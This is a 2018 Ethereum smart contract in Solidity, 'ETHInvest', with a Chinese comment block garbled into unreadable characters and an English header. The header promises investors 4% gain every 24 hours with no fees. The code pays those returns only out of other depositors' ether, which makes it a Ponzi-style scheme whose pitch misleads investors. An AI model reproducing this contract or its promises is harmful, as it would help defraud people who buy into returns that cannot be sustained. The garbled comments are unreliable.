/**

 *Submitted for verification at Etherscan.io on 2018-10-11

*/



pragma solidity ^0.4.24;



/**

 * ETHͶ�ʺ�Լ

 *  - ��� 4% ����ÿ 24 Сʱ

 *  - ���Ͷ�����κ�Ӷ��(ÿ�ʽ��׶��ں�Լ�����)

 *  - �����߲���ȡ�κη��ã������ϸ�����û�й���Ա(��鿴����)

 *

 * ���ʹ�ã�

 *  1. ������ҪͶ����������̫��

 *  2. ���� 0 ��̫�ҵ���Լ��ȡ������� / ������������̫�һ�ø�������

 *

 * ������̫��GAS���ã�70000

 * GAS�۸�鿴��https://ethgasstation.info/

 *

 * ETHInvest Contract

 *  - GAIN 4% PER 24 HOURS (every 5900 blocks) 

 *  - NO COMMISSION on your investment (every ether stays on contract's balance)

 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)

 *

 * How to use: 

 *  1. Send any amount of ether to make an investment

 *  2. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)

 *  OR /  Send more ether to reinvest AND get your profit at the same time

 *

 * RECOMMENDED GAS LIMIT: 70000

 * RECOMMENDED GAS PRICE: https://ethgasstation.info/

 *

 */

contract ETHInvest {

    // records amounts invested

    mapping (address => uint256) invested;

    // records blocks at which investments were made

    mapping (address => uint256) atBlock;



    // this function called every time anyone sends a transaction to this contract

    function () external payable {

        // if sender (aka YOU) is invested more than 0 ether

        if (invested[msg.sender] != 0) {

            // calculate profit amount as such:

            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900

            // 5900 is an average block count per day produced by Ethereum blockchain

            uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;



            // send calculated amount of ether directly to sender (aka YOU)

            address sender = msg.sender;

            sender.transfer(amount);

        }



        // record block number and invested amount (msg.value) of this transaction

        atBlock[msg.sender] = block.number;

        invested[msg.sender] += msg.value;

    }

}